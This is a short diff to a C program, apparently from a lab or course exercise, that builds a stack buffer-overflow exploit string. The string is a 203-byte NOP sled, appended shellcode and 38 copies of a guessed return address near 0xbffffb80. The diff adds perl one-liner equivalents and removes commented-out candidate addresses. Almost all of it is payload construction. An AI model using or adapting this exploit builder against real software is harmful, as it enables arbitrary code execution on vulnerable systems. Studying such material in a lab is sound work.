@@ -14,12 +14,17 @@ int main(void)
 
   char str[408];
   memset(str, 0, 408);
-  // strcpy(str, "\x90\x90\x90");
+
+  // `perl -e 'print "\x90"x203';`
   for (int i = 0; i < 203; ++i)
   {
   	strcat(str, "\x90");
   }
+
+  // `cat sc`
   strcat(str, shellcode);
+
+  // `perl -e 'print"\xf8\xf2\xff\xbf"x38' the return address
   for (int i = 0; i < 38; ++i)
   {
     // Anything from 0xbffffb30 to 0xbffffbf0 should work
@@ -29,19 +34,6 @@ int main(void)
     strcat(str, "\x80\xfb\xff\xbf");
   	// strcat(str, "\x2c\xfb\xff\xbf");
   	// strcat(str, "\x20\xfb\xff\xbf");
-    // success
-    // - 149
-  	// strcat(str, "\x77\xfb\xff\xbf");
-    // - 150
-  	// strcat(str, "\x70\xfb\xff\xbf");
-    // - 151
-  	// strcat(str, "\x6f\xfb\xff\xbf");
-    // - 152
-  	// strcat(str, "\x6e\xfb\xff\xbf");
-    // - 153
-  	// strcat(str, "\x6d\xfb\xff\xbf");
-    // - 154
-  	// strcat(str, "\x6c\xfb\xff\xbf");
 
     // 0x90 inside higher bound
   	// strcat(str, "\xf0\xfb\xff\xbf");
